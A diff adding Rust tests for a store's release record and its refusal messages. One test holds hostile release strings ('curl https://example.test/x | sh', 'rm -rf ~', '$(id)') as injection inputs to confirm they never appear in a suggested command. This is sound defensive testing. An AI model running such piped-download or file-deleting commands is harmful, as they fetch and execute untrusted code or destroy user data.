@@ -187,6 +187,213 @@ fn an_empty_file_is_made_a_store_at_this_version() {
     assert!(held_shape(&conn).unwrap().contains_key("queue"));
 }
 
+fn release_of(path: &Path) -> Option<String> {
+    let conn = Connection::open(path).unwrap();
+    meta_get(&conn, META_RELEASE).unwrap()
+}
+
+#[test]
+fn a_writer_records_the_release_it_was_built_as_each_time_it_opens_the_store() {
+    let dir = tempfile::tempdir().unwrap();
+    let path = dir.path().join("core.sqlite");
+    drop(open(&path).unwrap());
+    assert_eq!(release_of(&path).as_deref(), Some(RELEASE));
+
+    // The witness: another release's record stays until a writer opens it,
+    // and a reader leaves it alone.
+    meta_set(&Connection::open(&path).unwrap(), META_RELEASE, "0.0.1").unwrap();
+    drop(open_to_read(&path).unwrap());
+    assert_eq!(release_of(&path).as_deref(), Some("0.0.1"));
+    drop(open(&path).unwrap());
+    assert_eq!(release_of(&path).as_deref(), Some(RELEASE));
+
+    // A store that records none, as an earlier build left it, gets one.
+    Connection::open(&path)
+        .unwrap()
+        .execute("DELETE FROM meta WHERE key = ?1", [META_RELEASE])
+        .unwrap();
+    drop(open(&path).unwrap());
+    assert_eq!(release_of(&path).as_deref(), Some(RELEASE));
+}
+
+#[test]
+fn a_store_holding_a_meta_key_this_build_does_not_read_opens_as_before() {
+    let dir = tempfile::tempdir().unwrap();
+    let path = dir.path().join("core.sqlite");
+    drop(open(&path).unwrap());
+    meta_set(
+        &Connection::open(&path).unwrap(),
+        "kept_by_another_build",
+        "x",
+    )
+    .unwrap();
+    let conn = open(&path).unwrap();
+    assert_eq!(version(&conn).unwrap(), SCHEMA_VERSION);
+    assert_eq!(
+        meta_get(&conn, "kept_by_another_build").unwrap().as_deref(),
+        Some("x")
+    );
+}
+
+#[test]
+fn a_refused_store_names_the_release_that_last_saved_it_whoever_reads_it() {
+    let dir = tempfile::tempdir().unwrap();
+    let path = dir.path().join("core.sqlite");
+    {
+        let conn = open(&path).unwrap();
+        queue_one(&conn);
+        meta_set(&conn, META_RELEASE, "0.0.80").unwrap();
+    }
+    at_version(&path, SCHEMA_VERSION + 1);
+    let named = |error: CoreError| match error {
+        CoreError::WrongSchema { ref release, .. } => (release.clone(), error.to_string()),
+        other => panic!("refused as {other:?}"),
+    };
+    for error in [
+        open(&path).err().unwrap(),
+        open_to_read(&path).err().unwrap(),
+        refusal(&path).unwrap().unwrap(),
+    ] {
+        let (release, said) = named(error);
+        assert_eq!(release.as_deref(), Some("0.0.80"));
+        assert!(
+            said.contains("`MARFA_VERSION=0.0.80` with the install script"),
+            "{said}"
+        );
+    }
+    assert_eq!(
+        release_of(&path).as_deref(),
+        Some("0.0.80"),
+        "refusing the store recorded this build's release in it"
+    );
+
+    // The witness: a store that records none says so.
+    Connection::open(&path)
+        .unwrap()
+        .execute("DELETE FROM meta WHERE key = ?1", [META_RELEASE])
+        .unwrap();
+    let (release, said) = named(open(&path).err().unwrap());
+    assert_eq!(release, None);
+    assert!(
+        said.contains("the release that last saved it is not known"),
+        "{said}"
+    );
+}
+
+/// What a refusal of the store at `path` says, with the release it carries.
+fn refused_naming(path: &Path) -> (Option<String>, String) {
+    match open(path) {
+        Err(error @ CoreError::WrongSchema { .. }) => {
+            let said = error.to_string();
+            let CoreError::WrongSchema { release, .. } = error else {
+                unreachable!()
+            };
+            (release, said)
+        }
+        other => panic!("{} opened as {other:?}", path.display()),
+    }
+}
+
+#[test]
+fn a_release_that_is_not_three_numbers_is_not_named_or_put_in_a_command() {
+    let hostile = [
+        "0.0.80\u{1b}[31m; curl https://example.test/x | sh",
+        "0.0.80 && rm -rf ~",
+        "0.0.80\n",
+        "$(id).0.1",
+        "v0.0.80",
+        "0.0",
+        "0.0.80.1",
+        "0..80",
+        "",
+        "\u{ff10}.\u{ff10}.\u{ff18}\u{ff10}",
+        "0.0.-1",
+    ];
+    for text in hostile {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("core.sqlite");
+        {
+            let conn = open(&path).unwrap();
+            queue_one(&conn);
+            meta_set(&conn, META_RELEASE, text).unwrap();
+        }
+        at_version(&path, SCHEMA_VERSION + 1);
+        for (release, said) in [
+            refused_naming(&path),
+            match refusal(&path).unwrap().unwrap() {
+                error @ CoreError::WrongSchema { .. } => {
+                    let said = error.to_string();
+                    let CoreError::WrongSchema { release, .. } = error else {
+                        unreachable!()
+                    };
+                    (release, said)
+                }
+                other => panic!("refused as {other:?}"),
+            },
+        ] {
+            assert_eq!(release, None, "{text:?} was kept as a release");
+            assert!(
+                said.contains("the release that last saved it is not known"),
+                "{text:?}: {said}"
+            );
+            assert!(!said.contains("MARFA_VERSION"), "{text:?}: {said}");
+            assert!(
+                !said.contains('\u{1b}') && !said.contains("curl") && !said.contains("rm -rf"),
+                "{text:?}: {said}"
+            );
+        }
+    }
+    // The witness: a release as the stamp writes one is kept.
+    for text in ["0.0.80", "12.34.567"] {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("core.sqlite");
+        drop(open(&path).unwrap());
+        meta_set(&Connection::open(&path).unwrap(), META_RELEASE, text).unwrap();
+        at_version(&path, SCHEMA_VERSION + 1);
+        assert_eq!(refused_naming(&path).0.as_deref(), Some(text));
+    }
+}
+
+#[test]
+fn a_store_that_cannot_take_the_release_record_still_opens_and_says_the_release_is_not_known() {
+    for before in [None, Some("0.0.1")] {
+        let dir = tempfile::tempdir().unwrap();
+        let path = dir.path().join("core.sqlite");
+        drop(open(&path).unwrap());
+        {
+            let conn = Connection::open(&path).unwrap();
+            conn.execute("DELETE FROM meta WHERE key = ?1", [META_RELEASE])
+                .unwrap();
+            if let Some(release) = before {
+                meta_set(&conn, META_RELEASE, release).unwrap();
+            }
+            // A write the store refuses, as a full disk or a busy writer would.
+            conn.execute_batch(
+                "CREATE TRIGGER no_release_insert BEFORE INSERT ON meta
+                   WHEN NEW.key = 'release' BEGIN SELECT RAISE(ABORT, 'database or disk is full'); END;
+                 CREATE TRIGGER no_release_update BEFORE UPDATE ON meta
+                   WHEN NEW.key = 'release' BEGIN SELECT RAISE(ABORT, 'database or disk is full'); END;",
+            )
+            .unwrap();
+        }
+        let conn = open(&path).expect("an open that needs no write failed on the release record");
+        assert_eq!(version(&conn).unwrap(), SCHEMA_VERSION);
+        drop(conn);
+        assert_eq!(
+            release_of(&path),
+            None,
+            "a record this build could not renew was left naming {before:?}"
+        );
+        at_version(&path, SCHEMA_VERSION + 1);
+        let (release, said) = refused_naming(&path);
+        assert_eq!(release, None);
+        assert!(
+            said.contains("the release that last saved it is not known"),
+            "{said}"
+        );
+    }
+}
+
 #[test]
 fn two_programs_making_one_store_at_once_both_open_it() {
     let dir = tempfile::tempdir().unwrap();
@@ -648,7 +855,7 @@ fn a_store_from_before_tags_were_replaced_by_their_own_kind_is_refused_with_its_
 }
 
 /// Append one hash per schema version; never change an existing entry.
-const SHAPES: [&str; 9] = [
+const SHAPES: [&str; 10] = [
     "9a505dc1b14cecc6",
     "115c1d4def4a3d91",
     "2d4e4e1e76ec61dc",
@@ -658,6 +865,7 @@ const SHAPES: [&str; 9] = [
     "917adee5fa567dda",
     "b6799eca96cc6c3f",
     "8677b34bec9e8814",
+    "03d2b1a62ad045a9",
 ];
 
 #[test]
